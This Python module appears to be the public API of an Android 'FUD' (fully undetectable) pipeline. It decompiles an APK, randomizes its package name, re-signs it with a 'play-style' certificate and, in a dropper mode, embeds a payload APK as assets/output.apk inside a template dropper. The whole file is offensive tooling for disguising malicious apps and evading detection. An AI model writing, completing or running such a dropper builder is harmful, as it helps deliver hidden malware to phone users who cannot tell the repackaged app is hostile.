"""FUD pipeline — public API."""
import os
import shutil
import time
import zipfile

from setup import ensure_tools
from apktool_wrapper import decompile, recompile
from package_rename import rename_package
from signer import sign_apk


def _step(session_dir, msg):
    try:
        with open(os.path.join(session_dir, "step.txt"), "w") as f:
            f.write(msg)
    except Exception:
        pass
    print(f"\n===== {msg} ===== t={time.time():.0f}", flush=True)


def _embed_payload(apk_path: str, payload_apk: str):
    """Inject payload APK as assets/output.apk inside the template APK."""
    tmp = apk_path + ".tmp"
    with zipfile.ZipFile(apk_path, "r") as zin, \
         zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            fn = item.filename
            if fn.startswith("META-INF/"):
                continue
            if fn == "assets/output.apk":
                continue
            zout.writestr(item, zin.read(fn))
        with open(payload_apk, "rb") as f:
            zout.writestr("assets/output.apk", f.read(),
                          compress_type=zipfile.ZIP_STORED)
    shutil.move(tmp, apk_path)


def _replace_assets_output(decompiled_dir: str, payload_apk: str):
    """Put payload into decompiled assets/output.apk so apktool b packs it."""
    assets = os.path.join(decompiled_dir, "assets")
    os.makedirs(assets, exist_ok=True)
    dst = os.path.join(assets, "output.apk")
    shutil.copy2(payload_apk, dst)
    print(f"[✓] payload embedded → assets/output.apk "
          f"({os.path.getsize(dst)} bytes)", flush=True)


def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    """No-template mode: just repackage + sign."""
    _step(session_dir, "ensure_tools")
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    _step(session_dir, "1/4 decompile")
    decompiled = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled)

    _step(session_dir, "2/4 random package")
    rename_package(decompiled)

    _step(session_dir, "3/4 recompile")
    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    _step(session_dir, "4/4 sign")
    sign_apk(unsigned, output_apk)
    _step(session_dir, "done")
    print(f"[✓] DONE → {output_apk}", flush=True)
    return output_apk


def full_fud_pipeline_dropper(template_apk: str, payload_apk: str,
                              output_apk: str, session_dir: str) -> str:
    """
    Template (dropper) mode:
      - template_apk = user's dropper smali APK
      - payload_apk  = user's actual app to embed as assets/output.apk
      - package name randomized
      - signed with play-style cert
    """
    _step(session_dir, "ensure_tools")
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    _step(session_dir, "1/5 decompile template")
    decompiled = os.path.join(session_dir, "decompiled")
    decompile(template_apk, decompiled)

    _step(session_dir, "2/5 embed payload")
    _replace_assets_output(decompiled, payload_apk)

    _step(session_dir, "3/5 random package")
    new_pkg = rename_package(decompiled)
    print(f"[i] new package = {new_pkg}", flush=True)

    _step(session_dir, "4/5 recompile")
    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    _step(session_dir, "5/5 sign")
    sign_apk(unsigned, output_apk)
    _step(session_dir, "done")
    print(f"[✓] DROPPER DONE → {output_apk}", flush=True)
    return output_apk
